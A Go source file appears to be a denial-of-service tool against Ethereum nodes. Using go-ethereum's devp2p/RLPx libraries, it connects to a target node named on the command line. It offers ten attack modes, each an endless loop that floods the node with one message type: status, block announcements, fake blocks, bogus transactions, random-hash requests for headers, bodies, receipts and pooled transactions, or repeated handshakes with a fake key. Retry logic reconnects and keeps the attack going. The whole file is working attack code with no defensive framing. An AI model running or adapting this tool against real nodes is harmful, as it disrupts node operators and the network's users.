package main

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"io"
	"math/big"
	mrand "math/rand"
	"net"
	"os"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/eth/protocols/eth"
	"github.com/ethereum/go-ethereum/p2p"
	"github.com/ethereum/go-ethereum/p2p/enode"
	"github.com/ethereum/go-ethereum/p2p/rlpx"
	"github.com/ethereum/go-ethereum/rlp"
)

const (
	// devp2p message codes (from p2p/peer.go)
	handshakeMsg = 0x00
	discMsg      = 0x01
	pingMsg      = 0x02
	pongMsg      = 0x03
)

// Global connection for sending messages
var globalConn *rlpx.Conn

// protoHandshake is the RLP structure of the protocol handshake
type protoHandshake struct {
	Version    uint64
	Name       string
	Caps       []p2p.Cap
	ListenPort uint64
	ID         []byte `rlp:"tail"`
}

// connWrapper wraps *rlpx.Conn to implement p2p.MsgWriter interface
type connWrapper struct {
	conn *rlpx.Conn
}

func (cw *connWrapper) WriteMsg(msg p2p.Msg) error {
	// Copy message data to buffer
	var buf bytes.Buffer
	if _, err := io.CopyN(&buf, msg.Payload, int64(msg.Size)); err != nil {
		return err
	}

	// Write using the underlying rlpx connection
	_, err := cw.conn.Write(msg.Code, buf.Bytes())
	return err
}

// connectToNode establishes a P2P connection to the target node with retry logic
func connectToNode(node *enode.Node) (*rlpx.Conn, error) {
	maxRetries := 3
	for attempt := 1; attempt <= maxRetries; attempt++ {
		// Create TCP connection with timeout
		tcpEndpoint, _ := node.TCPEndpoint()
		fmt.Printf("Connecting to %s (attempt %d/%d)...\n", tcpEndpoint.String(), attempt, maxRetries)

		fd, err := net.DialTimeout("tcp", tcpEndpoint.String(), 10*time.Second)
		if err != nil {
			if attempt == maxRetries {
				return nil, fmt.Errorf("failed to connect to %s after %d attempts: %v", tcpEndpoint.String(), maxRetries, err)
			}
			fmt.Printf("Connection attempt %d failed, retrying in 2 seconds...\n", attempt)
			time.Sleep(2 * time.Second)
			continue
		}
		fmt.Printf("TCP connection established\n")

		// Create RLPx connection
		conn := rlpx.NewConn(fd, node.Pubkey())

		// Generate a private key for this connection
		key, err := crypto.GenerateKey()
		if err != nil {
			fd.Close()
			if attempt == maxRetries {
				return nil, fmt.Errorf("failed to generate key: %v", err)
			}
			continue
		}

		// Perform RLPx handshake with timeout
		fmt.Printf("Performing RLPx handshake...\n")
		fd.SetDeadline(time.Now().Add(15 * time.Second))
		_, err = conn.Handshake(key)
		if err != nil {
			fd.Close()
			if attempt == maxRetries {
				return nil, fmt.Errorf("RLPx handshake failed: %v", err)
			}
			fmt.Printf("RLPx handshake failed, retrying...\n")
			time.Sleep(2 * time.Second)
			continue
		}
		fmt.Printf("RLPx handshake successful\n")

		// Perform protocol handshake
		fmt.Printf("Performing protocol handshake...\n")
		fd.SetDeadline(time.Now().Add(10 * time.Second))
		if err := performProtocolHandshake(conn); err != nil {
			fd.Close()
			if attempt == maxRetries {
				return nil, fmt.Errorf("protocol handshake failed: %v", err)
			}
			fmt.Printf("Protocol handshake failed, retrying...\n")
			time.Sleep(2 * time.Second)
			continue
		}
		fmt.Printf("Protocol handshake successful\n")

		// Remove deadline for ongoing communication
		fd.SetDeadline(time.Time{})

		return conn, nil
	}
	return nil, fmt.Errorf("failed to connect after %d attempts", maxRetries)
}

// performProtocolHandshake performs the devp2p protocol handshake
func performProtocolHandshake(conn *rlpx.Conn) error {
	// Create our handshake message
	ourKey, _ := crypto.GenerateKey()
	pub0 := crypto.FromECDSAPub(&ourKey.PublicKey)[1:]
	ourHandshake := &protoHandshake{
		Version: 5,
		Name:    "geth",
		Caps: []p2p.Cap{
			{Name: "eth", Version: 68},
			{Name: "eth", Version: 67},
			{Name: "eth", Version: 66},
			{Name: "snap", Version: 1},
		},
		ListenPort: 30303,
		ID:         pub0,
	}

	// Send our handshake
	payload, err := rlp.EncodeToBytes(ourHandshake)
	if err != nil {
		return fmt.Errorf("failed to encode handshake: %v", err)
	}

	fmt.Printf("Sending handshake with %d bytes\n", len(payload))
	_, err = conn.Write(0x00, payload) // handshakeMsg = 0x00
	if err != nil {
		return fmt.Errorf("failed to write handshake: %v", err)
	}

	// Read their handshake
	fmt.Printf("Reading response...\n")
	code, data, _, err := conn.Read()
	if err != nil {
		return fmt.Errorf("failed to read response: %v", err)
	}

	fmt.Printf("Received message with code: %d, data length: %d\n", code, len(data))

	if code != 0x00 {
		return fmt.Errorf("expected handshake message (code 0x00), got code %d", code)
	}

	var theirHandshake protoHandshake
	if err := rlp.DecodeBytes(data, &theirHandshake); err != nil {
		return fmt.Errorf("failed to decode their handshake: %v", err)
	}

	fmt.Printf("Handshake successful. Their version: %d, name: %s, caps: %v\n",
		theirHandshake.Version, theirHandshake.Name, theirHandshake.Caps)

	// Enable snappy if supported
	if theirHandshake.Version >= 5 {
		conn.SetSnappy(true)
		fmt.Printf("Enabled snappy compression\n")
	}

	return nil
}

// SetConnection allows you to set the global connection that you established manually
func SetConnection(conn *rlpx.Conn) {
	globalConn = conn
	fmt.Printf("Global connection set successfully\n")
}

// sendEthMessage sends an eth protocol message using p2p.Send
func sendEthMessage(conn *rlpx.Conn, code uint64, data interface{}) error {
	if conn == nil {
		return fmt.Errorf("no connection provided")
	}

	// Create wrapper around the connection
	wrapper := &connWrapper{conn: conn}
	return p2p.Send(wrapper, code, data)
}

// StatusDOS implements a DoS attack by sending rapid status messages
func StatusDOS(conn *rlpx.Conn, node *enode.Node) error {
	fmt.Printf("Starting Status DoS attack on %s\n", node.URLv4())

	for {
		status := &eth.StatusPacket{
			ProtocolVersion: 68,
			NetworkID:       1,
			TD:              big.NewInt(0),
			Head:            common.Hash{},
			Genesis:         common.Hash{},
		}
		if err := sendEthMessage(conn, eth.StatusMsg, status); err != nil {
			return fmt.Errorf("failed to send status: %v", err)
		}
		fmt.Printf("Sent StatusMsg: %+v\n", status)
	}
}

// NewBlockHashesDOS implements a DoS attack by sending rapid block hash announcements
func NewBlockHashesDOS(conn *rlpx.Conn, node *enode.Node) error {
	fmt.Printf("Starting NewBlockHashes DoS attack on %s\n", node.URLv4())

	var i uint64
	for {
		hashes := eth.NewBlockHashesPacket{{Hash: common.BytesToHash(make([]byte, 32)), Number: i}}
		mrand.Read(hashes[0].Hash[:])
		if err := sendEthMessage(conn, eth.NewBlockHashesMsg, hashes); err != nil {
			return fmt.Errorf("failed to send block hashes: %v", err)
		}
		fmt.Printf("Sent NewBlockHashesMsg: %+v\n", hashes)
		i++
	}
}

// TransactionsDOS implements a DoS attack by sending rapid transaction messages
func TransactionsDOS(conn *rlpx.Conn, node *enode.Node) error {
	fmt.Printf("Starting Transactions DoS attack on %s\n", node.URLv4())

	var i uint64
	for {
		tx := types.NewTransaction(i, common.Address{}, big.NewInt(0), 21000, big.NewInt(0), []byte{})
		txs := eth.TransactionsPacket{tx}
		if err := sendEthMessage(conn, eth.TransactionsMsg, txs); err != nil {
			return fmt.Errorf("failed to send transactions: %v", err)
		}
		fmt.Printf("Sent TransactionsMsg: %+v\n", txs)
		i++
	}
}

// GetBlockHeadersDOS implements a DoS attack by sending rapid block header requests
func GetBlockHeadersDOS(conn *rlpx.Conn, node *enode.Node) error {
	fmt.Printf("Starting GetBlockHeaders DoS attack on %s\n", node.URLv4())

	// Send initial status message as required by eth protocol
	fmt.Printf("Sending initial status message...\n")
	status := &eth.StatusPacket{
		ProtocolVersion: 68,
		NetworkID:       1,
		TD:              big.NewInt(0),
		Head:            common.Hash{},
		Genesis:         common.Hash{},
	}
	if err := sendEthMessage(conn, eth.StatusMsg, status); err != nil {
		return fmt.Errorf("failed to send initial status: %v", err)
	}
	fmt.Printf("Initial status message sent successfully\n")

	var blockNum uint64 = 19000000
	messageCount := 0

	for {
		amount := 5 + (messageCount % 10)
		skip := messageCount % 3

		req := &eth.GetBlockHeadersPacket{
			RequestId: mrand.Uint64(),
			GetBlockHeadersRequest: &eth.GetBlockHeadersRequest{
				Origin:  eth.HashOrNumber{Number: blockNum},
				Amount:  uint64(amount),
				Skip:    uint64(skip),
				Reverse: messageCount%10 == 0,
			},
		}

		if err := sendEthMessage(conn, eth.GetBlockHeadersMsg, req); err != nil {
			return fmt.Errorf("failed to send block header request: %v", err)
		}

		fmt.Printf("Sent GetBlockHeadersMsg: RequestId=%d, BlockNum=%d, Amount=%d, Skip=%d, Reverse=%v\n",
			req.RequestId, blockNum, amount, skip, messageCount%10 == 0)

		messageCount++
		blockNum++
	}
}

// GetBlockBodiesDOS implements a DoS attack by sending rapid block body requests
func GetBlockBodiesDOS(conn *rlpx.Conn, node *enode.Node) error {
	fmt.Printf("Starting GetBlockBodies DoS attack on %s\n", node.URLv4())

	for {
		hashes := make([]common.Hash, 5)
		for j := range hashes {
			rand.Read(hashes[j][:])
		}
		req := &eth.GetBlockBodiesPacket{
			RequestId:             mrand.Uint64(),
			GetBlockBodiesRequest: hashes,
		}
		if err := sendEthMessage(conn, eth.GetBlockBodiesMsg, req); err != nil {
			return fmt.Errorf("failed to send block body request: %v", err)
		}
		fmt.Printf("Sent GetBlockBodiesMsg: RequestId=%d, Hashes=%d\n", req.RequestId, len(hashes))
	}
}

// NewBlockDOS implements a DoS attack by sending rapid new block messages
func NewBlockDOS(conn *rlpx.Conn, node *enode.Node) error {
	fmt.Printf("Starting NewBlock DoS attack on %s\n", node.URLv4())

	var i int64
	for {
		header := &types.Header{
			Number:     big.NewInt(i),
			Time:       uint64(time.Now().Unix()),
			Difficulty: big.NewInt(1),
		}
		block := types.NewBlock(header, nil, nil, nil)
		packet := &eth.NewBlockPacket{
			Block: block,
			TD:    big.NewInt(1),
		}
		if err := sendEthMessage(conn, eth.NewBlockMsg, packet); err != nil {
			return fmt.Errorf("failed to send new block: %v", err)
		}
		fmt.Printf("Sent NewBlockMsg: BlockNum=%d\n", i)
		i++
	}
}

// NewPooledTransactionHashesDOS implements a DoS attack by sending rapid transaction hash announcements
func NewPooledTransactionHashesDOS(conn *rlpx.Conn, node *enode.Node) error {
	fmt.Printf("Starting NewPooledTransactionHashes DoS attack on %s\n", node.URLv4())

	for {
		hashes := make([]common.Hash, 100)
		types := make([]byte, 100)
		sizes := make([]uint32, 100)
		for j := range hashes {
			rand.Read(hashes[j][:])
			types[j] = 0
			sizes[j] = 1000
		}
		packet := eth.NewPooledTransactionHashesPacket{
			Types:  types,
			Sizes:  sizes,
			Hashes: hashes,
		}
		if err := sendEthMessage(conn, eth.NewPooledTransactionHashesMsg, packet); err != nil {
			return fmt.Errorf("failed to send transaction hashes: %v", err)
		}
		fmt.Printf("Sent NewPooledTransactionHashesMsg: %d hashes\n", len(hashes))
	}
}

// GetPooledTransactionsDOS implements a DoS attack by sending rapid transaction requests
func GetPooledTransactionsDOS(conn *rlpx.Conn, node *enode.Node) error {
	fmt.Printf("Starting GetPooledTransactions DoS attack on %s\n", node.URLv4())

	for {
		hashes := make([]common.Hash, 5)
		for j := range hashes {
			rand.Read(hashes[j][:])
		}
		req := &eth.GetPooledTransactionsPacket{
			RequestId:                    mrand.Uint64(),
			GetPooledTransactionsRequest: hashes,
		}
		if err := sendEthMessage(conn, eth.GetPooledTransactionsMsg, req); err != nil {
			return fmt.Errorf("failed to send transaction request: %v", err)
		}
		fmt.Printf("Sent GetPooledTransactionsMsg: RequestId=%d, Hashes=%d\n", req.RequestId, len(hashes))
	}
}

// GetReceiptsDOS implements a DoS attack by sending rapid receipt requests
func GetReceiptsDOS(conn *rlpx.Conn, node *enode.Node) error {
	fmt.Printf("Starting GetReceipts DoS attack on %s\n", node.URLv4())

	for {
		hashes := make([]common.Hash, 5)
		for j := range hashes {
			rand.Read(hashes[j][:])
		}
		req := &eth.GetReceiptsPacket{
			RequestId:          mrand.Uint64(),
			GetReceiptsRequest: hashes,
		}
		if err := sendEthMessage(conn, eth.GetReceiptsMsg, req); err != nil {
			return fmt.Errorf("failed to send receipt request: %v", err)
		}
		fmt.Printf("Sent GetReceiptsMsg: RequestId=%d, Hashes=%d\n", req.RequestId, len(hashes))
	}
}

// reconnectIfNeeded attempts to reconnect if the connection is broken
func reconnectIfNeeded(conn *rlpx.Conn, node *enode.Node) (*rlpx.Conn, error) {
	if conn == nil {
		fmt.Printf("Connection is nil, establishing new connection...\n")
		return connectToNode(node)
	}

	// Test the connection by trying to read with a very short timeout
	// If this fails, we know the connection is broken
	originalDeadline := time.Now().Add(1 * time.Millisecond)
	err := conn.SetReadDeadline(originalDeadline)
	if err != nil {
		fmt.Printf("Failed to set read deadline, connection may be broken: %v\n", err)
		return connectToNode(node)
	}

	// Try to read a message to test connection
	_, _, _, err = conn.Read()

	// Clear the deadline
	conn.SetReadDeadline(time.Time{})

	// If we get EOF or timeout, connection is likely broken
	if err != nil && (err == io.EOF || isTimeoutError(err)) {
		fmt.Printf("Connection appears broken (%v), establishing new connection...\n", err)
		conn.Close()
		return connectToNode(node)
	}

	return conn, nil
}

// isTimeoutError checks if an error is a timeout error
func isTimeoutError(err error) bool {
	if netErr, ok := err.(net.Error); ok {
		return netErr.Timeout()
	}
	return false
}

// executeAttackWithRetry wraps attack functions with connection retry logic
func executeAttackWithRetry(node *enode.Node, attackFunc func(*rlpx.Conn, *enode.Node) error) error {
	var conn *rlpx.Conn
	var err error

	for {
		// Establish or re-establish connection if needed
		conn, err = reconnectIfNeeded(conn, node)
		if err != nil {
			fmt.Printf("Failed to establish connection: %v. Retrying in 5 seconds...\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		// Run the attack
		err = attackFunc(conn, node)
		if err != nil {
			fmt.Printf("Attack failed: %v. Reconnecting in 3 seconds...\n", err)
			if conn != nil {
				conn.Close()
				conn = nil
			}
			time.Sleep(3 * time.Second)
			continue
		}
	}
}

// ProtocolHandshakeFloodDOS implements a DoS attack by sending rapid handshake messages
// This floods the target with repeated handshake attempts
func ProtocolHandshakeFloodDOS(conn *rlpx.Conn, node *enode.Node) error {
	if conn == nil {
		return fmt.Errorf("no connection provided")
	}

	fmt.Printf("Starting protocol handshake flood attack on %s\n", node.URLv4())
	counter := 0

	// Create a malicious handshake with invalid/overwhelming data
	handshake := protoHandshake{
		Version:    5,
		Name:       "DoSAttacker/1.0.0/linux/go1.21.0",
		Caps:       []p2p.Cap{{"eth", 68}, {"snap", 1}, {"les", 4}},
		ListenPort: 30303,
		ID:         make([]byte, 64), // Invalid/fake public key
	}

	for {
		// Create wrapper around the connection
		wrapper := &connWrapper{conn: conn}

		// Send handshake message
		err := p2p.Send(wrapper, handshakeMsg, handshake)
		if err != nil {
			return fmt.Errorf("failed to send handshake message: %v", err)
		}

		counter++
		if counter%100 == 0 {
			fmt.Printf("Sent %d handshake messages\n", counter)
		}

		// Add a tiny delay to prevent overwhelming the local system
		// but still flood the target as fast as possible
		//time.Sleep(1 * time.Millisecond)
	}
}

func runEthDOS() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: go run eth.go <attack_type> <target_node>")
		fmt.Println("Note: You must set the connection manually using SetConnection() before running attacks")
		os.Exit(1)
	}

	attackType := os.Args[1]
	targetNode := os.Args[2]

	node, err := enode.Parse(enode.ValidSchemes, targetNode)
	if err != nil {
		fmt.Printf("Invalid node URL: %v\n", err)
		os.Exit(1)
	}

	var attackErr error
	switch attackType {
	case "status":
		attackErr = executeAttackWithRetry(node, StatusDOS)
	case "newblockhashes":
		attackErr = executeAttackWithRetry(node, NewBlockHashesDOS)
	case "transactions":
		attackErr = executeAttackWithRetry(node, TransactionsDOS)
	case "getblockheaders":
		attackErr = executeAttackWithRetry(node, GetBlockHeadersDOS)
	case "getblockbodies":
		attackErr = executeAttackWithRetry(node, GetBlockBodiesDOS)
	case "newblock":
		attackErr = executeAttackWithRetry(node, NewBlockDOS)
	case "newpooledtxhashes":
		attackErr = executeAttackWithRetry(node, NewPooledTransactionHashesDOS)
	case "getpooledtxs":
		attackErr = executeAttackWithRetry(node, GetPooledTransactionsDOS)
	case "getreceipts":
		attackErr = executeAttackWithRetry(node, GetReceiptsDOS)
	case "handshakeflood":
		attackErr = executeAttackWithRetry(node, ProtocolHandshakeFloodDOS)
	default:
		fmt.Printf("Unknown attack type: %s\n", attackType)
		os.Exit(1)
	}

	if attackErr != nil {
		fmt.Printf("Attack failed: %v\n", attackErr)
		os.Exit(1)
	}
}
